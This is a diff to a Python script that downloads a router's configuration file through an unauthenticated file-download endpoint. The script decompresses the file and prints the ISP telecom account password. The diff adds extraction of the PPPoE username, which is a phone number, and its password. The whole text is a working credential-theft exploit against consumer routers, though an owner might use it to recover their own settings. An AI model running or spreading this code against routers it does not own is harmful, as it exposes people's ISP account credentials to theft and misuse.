@@ -9,6 +9,7 @@ import logging as log
 IP = "192.168.1.1"
 header_pattern = r'<compressed alg=lzw len=(\d+)>.+<crc=0x([0-9A-Fa-f]+)>'
 password_pattern = r'<X_CT-COM_TeleComAccount>.*\n.*<Password>(.*)</Password>'
+pppoe_pattern = r'<Username>(\d\d*)</Username>\n.*<Password>(.*)</Password>'
 
 response = requests.get("http://" + IP + "/downloadFile?file=/var/config/psi")
 assert response.status_code == 200
@@ -29,6 +30,10 @@ try:
     log.info("OK.")
     match = re.search(password_pattern, str(r))
     print("Password is: " + match.group(1))
+
+    match = re.search(pppoe_pattern, str(r))
+    print("Phone number is: " + match.group(1))
+    print("Password is: " + match.group(2))
 except Exception as e:
     log.info(e)
     log.info("Data decompression failed! Possible file corruption.")
